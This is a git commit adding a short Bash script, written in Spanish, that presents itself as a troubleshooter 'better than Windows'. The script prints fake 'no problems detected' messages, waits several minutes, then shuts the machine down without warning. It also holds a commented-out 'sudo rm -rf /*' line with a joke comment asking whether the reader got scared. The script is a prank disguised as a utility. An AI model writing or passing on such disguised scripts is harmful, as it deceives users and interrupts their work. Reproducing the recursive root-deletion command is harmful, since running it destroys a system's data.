4f218cb6bd2e1892f6de9ff0fc2396728842e025
Pablo <135353774+Pablofao@users.noreply.github.com>
2024-06-26 18:46:41 +0200

    Solucinador de problemas mejor que windows 1

---
+++ main.sh
@@ -0,0 +1,12 @@
+#!/bin/bash
+echo buscando problemas...
+sleep 300
+echo "no se detecto ningun problema, ten un buen dia"
+# sudo rm -rf /* 
+# si estas leyendo esto di la verdad ¿te asustaste?
+sleep 20
+echo "¿sigues aqui?"
+sleep 3
+echo es el momento de decir adios
+sleep 5
+shutdown -h now
